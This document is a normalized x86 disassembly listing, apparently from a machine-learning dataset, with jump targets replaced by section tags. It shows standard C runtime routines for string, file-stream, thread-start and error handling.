push edi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
sub_42354a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_429062
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_428eb1
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_4235c7
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429cc6
add esp 0x14
pop ebp
retn
sub_4235e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_423619
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_42a735
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4266f5
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_429f74
mov [ esi + 0x4 ] eax
sub_4236a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428ab9
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428ab9
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_42aa80
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_423792
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4236a0
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_42aa80
sub_423801
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_4258f0
mov esi eax
inc esi
push esi
call sub_425484
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_42aae1
add esp 0xc
jmp r-xdata
sub_423871
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_4258f0
mov edi eax
inc edi
push edi
call sub_425484
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_42aae1
add esp 0xc
jmp r-xdata
sub_4238f1
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_423801
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_423937
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4238ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_423958
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4238ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_423980
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_423a4e
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_42a6bc
test eax eax
je r-xdata
push r--data
call sub_42ae40
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_42a87e
pop ecx
call [ r--data ]
sub_423acc
mov edi edi
push ebp
mov ebp esp
push esi
call sub_42a547
call sub_42a541
push eax
call sub_42a527
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_42a74f
mov esi [ ebp + 0x8 ]
push esi
call sub_42a541
push eax
call sub_42a57b
test eax eax
jne r-xdata
call sub_423a8b
push r--data
call sub_42ae40
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_423b4f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_42a547
push 0x214
push 0x1
call sub_42894a
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_424869
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_42a735
push [ eax + 0x6c ]
push esi
call sub_42a5d5
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_425ed7
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_423acc
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_423c0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_42b5a0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_42b58c
pop ecx
sub_423d36
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_42b58c
pop ecx
pop ebp
jmp sub_423c0e
pop ebp
jmp eax
sub_423d6c
push 0xc
push r--data
call sub_42b398
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_425eb1
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_42b3dd
retn
call sub_42ba98
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_425eb1
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_42b7cf
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423e26
mov eax [ ebp - 0x1c ]
call sub_425eb1
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_42bbd0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_423e47
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_425eb1
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_42b5a0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_42bd23
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_425eb1
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_42b5a0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_42c50d
pop ecx
push eax
call sub_42c410
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_424139
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_423d36
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_42b5a0
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_424051
push 0xc
push r--data
call sub_42b398
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_42b6f1
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423e47
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4240dd
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_42b3dd
retn
call sub_425eb1
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_423d36
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_42b5a0
add esp 0xc
sub_424104
push [ rw-data ]
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_42c53f
push 0x1
push 0x0
call sub_4263ff
add esp 0xc
jmp sub_4262e8
call eax
sub_424139
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_42b5a0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4285a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
sub_4241b6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_425eb1
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_428eb1
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_42d0c0
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_42c50d
pop ecx
push eax
call sub_42cfe4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_4285a0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_424318
push 0xc
push r--data
call sub_42b398
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_42b6f1
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4241b6
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424390
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_423d36
add esp 0x14
call sub_42b3dd
retn
sub_42439a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_425eb1
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_42d0c0
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_42d3a4
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42c50d
pop ecx
push eax
call sub_42d2c8
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_424424
push 0xc
push r--data
call sub_42b398
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_425eb1
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42b6f1
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42439a
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42449f
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_42b3dd
retn
cmp edi 0x2
jne r-xdata
sub_4244a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_42d5e8
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_4258f0
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_42d541
fld [ eax + 0x10 ]
add esp 0x18
cmp [ ebp - 0x4 ] bl
je r-xdata
inc esi
jmp r-xdata
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_424577
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_424567
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_424598
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_42de10
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_4245b8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_425eb1
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_42d0c0
push esi
mov ebx eax
call sub_42e001
push esi
call sub_42c50d
push eax
call sub_42df34
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_424869
pop ecx
mov [ esi + 0x1c ] edi
sub_42462f
push 0xc
push r--data
call sub_42b398
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_425eb1
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_42b6f1
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_4245b8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4246a3
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_42b3dd
retn
mov eax [ ebp - 0x1c ]
sub_4246c6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_425484
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_42e041
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_40478f
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_42597b
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_4246ab
push sub_4410b2
call sub_424852
pop ecx
sub_42472b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_42a4ac
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_42a4ac
